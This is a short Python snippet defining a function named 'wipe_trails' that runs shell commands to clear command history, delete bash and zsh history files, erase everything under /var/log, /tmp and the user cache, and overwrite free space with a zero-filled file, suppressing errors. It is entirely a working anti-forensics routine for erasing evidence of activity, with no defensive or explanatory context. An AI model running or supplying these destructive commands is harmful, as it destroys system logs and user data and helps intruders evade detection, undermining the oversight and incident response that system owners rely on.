import os

def wipe_trails():
    os.system("history -c")
    os.system("rm -f ~/.bash_history ~/.zsh_history")
    os.system("rm -rf /var/log/* /tmp/* ~/.cache/* 2>/dev/null")
    try:
        os.system("dd if=/dev/zero of=/tmp/zero bs=1M count=100 2>/dev/null && rm -f /tmp/zero")
    except:
        pass
